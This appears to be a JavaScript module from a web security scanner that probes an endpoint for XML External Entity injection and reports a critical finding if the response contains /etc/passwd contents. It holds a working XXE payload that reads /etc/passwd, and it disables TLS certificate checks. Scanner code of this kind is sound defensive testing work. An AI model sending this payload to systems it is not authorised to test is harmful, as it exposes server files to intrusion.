const axios = require("axios");
const https = require("https");
const { createFinding } = require("../vulnerabilities/vulnerability.factory");

const scanXXE = async (targetUrl) => {
  const findings = [];
  try {
    const xxePayload = `<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [  
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<foo>&xxe;</foo>`;

    const response = await axios.post(targetUrl, xxePayload, {
      headers: {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) ATHX-Security-Scanner/4.2",
        "Content-Type": "application/xml",
      },
      httpsAgent: new https.Agent({ rejectUnauthorized: false }),
      timeout: 7000,
      validateStatus: () => true,
    });

    const bodyText = typeof response.data === "string" ? response.data : JSON.stringify(response.data || "");

    if (bodyText.includes("root:x:0:0:") || bodyText.includes("boot loader")) {
      const finding = createFinding("XXE_INJECTION") || {
        title: "XML External Entity (XXE) Injection",
        severity: "CRITICAL",
        cwe: "611",
        owasp: "API8:2023 Security Misconfiguration",
        description: `Target endpoint ${targetUrl} processed external XML entities and returned local system file contents (/etc/passwd).`,
      };
      findings.push(finding);
    }
  } catch (err) {
    console.warn(`[xxe-scanner] Error probing ${targetUrl}:`, err.message);
  }

  return findings;
};

module.exports = { scanXXE };
